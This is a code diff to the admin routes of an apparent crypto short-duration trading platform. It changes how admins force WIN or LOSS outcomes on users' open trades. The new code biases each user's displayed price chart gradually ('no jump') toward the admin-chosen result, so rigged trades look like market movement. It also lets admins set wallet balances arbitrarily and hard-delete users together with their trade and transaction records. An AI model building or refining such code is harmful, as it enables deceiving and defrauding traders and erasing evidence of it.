@@ -29,7 +29,6 @@ import InviteCode from "../models/InviteCode.js";
 import Transaction from "../models/Transaction.js";
 import GatewaySetting from "../models/GatewaySetting.js";
 import SecondsTrade from "../models/SecondsTrade.js";
-import { settleTrade } from "./secondsTrade.js";
 import { requireAuth } from "../middleware/auth.js";
 import { requireAdmin } from "../middleware/admin.js";
 
@@ -261,9 +260,12 @@ router.put(
         message: "User not found.",
       });
     }
-    const current = user.wallet.get(symbol) || 0;
-    const next = mode === "add" ? current + amount : amount;
-    // Negative balances are allowed (forced-loss deficits / admin corrections)
+    const current = Number(user.wallet.get(symbol) || 0);
+    // High-precision decimals (e.g. 0.09, 10.55) — store exact to 8dp
+    const next =
+      mode === "add"
+        ? Number((current + amount).toFixed(8))
+        : Number(Number(amount).toFixed(8));
     user.wallet.set(symbol, next);
     user.markModified("wallet");
     await user.save();
@@ -361,14 +363,17 @@ router.delete(
       });
     }
 
-    user.deletedAt = new Date();
-    user.banned = true;
-    await user.save();
+    // Hard purge — permanently remove user from database
+    await Promise.all([
+      SecondsTrade.deleteMany({ user: user._id }),
+      Transaction.deleteMany({ user: user._id }),
+    ]);
+    await User.findByIdAndDelete(user._id);
 
     return res.json({
       success: true,
-      message: "User deleted and removed from the directory.",
-      userId: user._id,
+      message: "User permanently deleted.",
+      userId: id,
     });
   })
 );
@@ -877,7 +882,8 @@ router.get(
   })
 );
 
-// PUT /seconds-trades/:id/force-outcome — Win / Loss with manual USD amount
+// PUT /seconds-trades/:id/force-outcome — stamp WIN/LOSS only (NO early settle)
+// Trade always runs full duration; settlement happens at timer = 0 only.
 router.put(
   "/seconds-trades/:id/force-outcome",
   requireDatabase,
@@ -917,94 +923,64 @@ router.put(
       });
     }
 
+    if (trade.status === "settling") {
+      trade.status = "open";
+    }
+
     if (req.body.outcome === "clear") {
-      if (trade.status !== "open") {
-        return res.status(400).json({
-          success: false,
-          error: "BadRequestError",
-          message: "Can only clear force on an open trade.",
-        });
-      }
       trade.forcedOutcome = null;
       trade.forcedAmount = null;
+      trade.priceBiasPercent = 0;
       await trade.save();
       return res.json({
         success: true,
-        message: "Forced outcome cleared.",
+        message: "Forced outcome cleared. Timer continues.",
         trade: serializeAdminTrade(trade),
       });
     }
 
-    if (
-      (req.body.amount == null || req.body.amount === "") &&
-      trade.forcedAmount == null
-    ) {
-      return res.status(422).json({
-        success: false,
-        error: "ValidationError",
-        message:
-          "Enter Manual Balance Add amount (e.g. 25). WIN credits stake + amount.",
-      });
+    // Optional legacy amount stamp — balance still settled only at timer end
+    if (req.body.amount != null && req.body.amount !== "") {
+      trade.forcedAmount = Number(req.body.amount);
     }
 
-    const forceAmount =
-      req.body.amount != null && req.body.amount !== ""
-        ? Number(req.body.amount)
-        : Number(trade.forcedAmount);
+    trade.forcedOutcome = req.body.outcome;
+    // Soft initial bias — ramp continues over remaining duration (no jump)
+    trade.priceBiasPercent =
+      req.body.outcome === "win"
+        ? Math.max(Number(trade.priceBiasPercent || 0), 0.35)
+        : Math.min(Number(trade.priceBiasPercent || 0), -0.35);
+    await trade.save();
 
-    // Single atomic settle with Force WIN/LOSS — also reclaim stuck "settling"
-    const settled = await settleTrade(trade._id, {
-      forceOutcome: req.body.outcome,
-      forceAmount,
-      exitPriceHint: Number(trade.entryPrice),
-    });
-
-    if (!settled || (settled.status !== "won" && settled.status !== "lost")) {
-      return res.status(409).json({
-        success: false,
-        error: "ConflictError",
-        message: "Trade could not be settled. Refresh and try again.",
-        trade: serializeAdminTrade(settled || trade),
-      });
+    const user = await User.findById(trade.user);
+    if (user) {
+      if (!user.chartBias) user.chartBias = new Map();
+      const cur = Number(user.chartBias.get(trade.asset) || 0);
+      if (req.body.outcome === "win") {
+        user.chartBias.set(trade.asset, Math.max(cur, 0.35));
+      } else {
+        user.chartBias.set(trade.asset, Math.min(cur, -0.35));
+      }
+      user.markModified("chartBias");
+      await user.save();
     }
 
-    // If another process already settled as market before our claim, warn admin
-    if (
-      settled.settleReason !== "admin_force" ||
-      settled.forcedOutcome !== req.body.outcome
-    ) {
-      return res.status(409).json({
-        success: false,
-        error: "ConflictError",
-        message:
-          "Trade was already settled by the market timer. Open a new trade and click Force WIN/LOSS before the timer hits 0.",
-        trade: serializeAdminTrade(settled),
-      });
-    }
-
-    const owner = await User.findById(trade.user);
-    const wallet =
-      owner?.wallet instanceof Map
-        ? Object.fromEntries(owner.wallet)
-        : { ...(owner?.wallet || {}) };
-
-    const add = Math.abs(Number(settled.forcedAmount || forceAmount || 0));
-    const msg =
-      settled.status === "won"
-        ? `Force WIN · credited $${Number(settled.payout || 0).toFixed(
-            2
-          )} (stake $${Number(settled.stake).toFixed(2)} + add $${add.toFixed(
-            2
-          )}). Wallet now $${Number(wallet.USDT || 0).toFixed(2)} USDT.`
-        : `Force LOSS · deducted $${add.toFixed(
-            2
-          )}. Wallet now $${Number(wallet.USDT || 0).toFixed(2)} USDT.`;
+    const remSec = Math.max(
+      0,
+      Math.ceil((new Date(trade.expiresAt).getTime() - Date.now()) / 1000)
+    );
 
     return res.json({
       success: true,
-      message: msg,
-      trade: serializeAdminTrade(settled),
-      wallet,
+      message:
+        req.body.outcome === "win"
+          ? `Force WIN locked · timer continues ${remSec}s · settles at 0`
+          : `Force LOSS locked · timer continues ${remSec}s · settles at 0`,
+      trade: serializeAdminTrade(trade, user),
+      wallet:
+        user?.wallet instanceof Map
+          ? Object.fromEntries(user.wallet)
+          : { ...(user?.wallet || {}) },
     });
   })
 );
@@ -1040,9 +1016,8 @@ router.put(
       });
     }
 
-    // Graph HIGH / LOW — lock WIN or LOSS (no manual balance amount).
-    // Candles drift via chart bias; trade settles on timer with forced outcome.
-    // Admin adjusts wallet separately via Update Wallet.
+    // Graph HIGH / LOW — lock WIN or LOSS (NO early settle).
+    // Candles drift gradually; trade settles only when timer hits 0.
     const goingUp = req.body.direction === "up";
     const goingDown = req.body.direction === "down";
 
@@ -1053,11 +1028,18 @@ router.put(
     } else if (goingUp) {
       trade.forcedOutcome = "win";
       trade.forcedAmount = null;
-      trade.priceBiasPercent = 5;
+      // Soft start — background ramp climbs toward target over remaining time
+      trade.priceBiasPercent = Math.max(
+        Number(trade.priceBiasPercent || 0),
+        0.35
+      );
     } else if (goingDown) {
       trade.forcedOutcome = "loss";
       trade.forcedAmount = null;
-      trade.priceBiasPercent = -5;
+      trade.priceBiasPercent = Math.min(
+        Number(trade.priceBiasPercent || 0),
+        -0.35
+      );
     }
     if (trade.status === "settling") trade.status = "open";
     await trade.save();
@@ -1070,21 +1052,22 @@ router.put(
       if (req.body.direction === "reset") {
         user.chartBias.set(trade.asset, 0);
       } else if (goingUp) {
-        const target = 5;
-        const next = cur < target ? Math.min(target, cur + 1.2) : target;
-        user.chartBias.set(trade.asset, next);
+        user.chartBias.set(trade.asset, Math.max(cur, 0.35));
       } else if (goingDown) {
-        const target = -5;
-        const next = cur > target ? Math.max(target, cur - 1.2) : target;
-        user.chartBias.set(trade.asset, next);
+        user.chartBias.set(trade.asset, Math.min(cur, -0.35));
       }
+      user.markModified("chartBias");
       await user.save();
     }
 
+    const remSec = Math.max(
+      0,
+      Math.ceil((new Date(trade.expiresAt).getTime() - Date.now()) / 1000)
+    );
     const label = goingUp
-      ? "Graph HIGH · WIN locked · candles rising"
+      ? `Graph HIGH · WIN locked · candles rising · settles in ${remSec}s`
       : goingDown
-        ? "Graph LOW · LOSS locked · candles falling"
+        ? `Graph LOW · LOSS locked · candles falling · settles in ${remSec}s`
         : "Graph bias reset.";
 
     res.json({
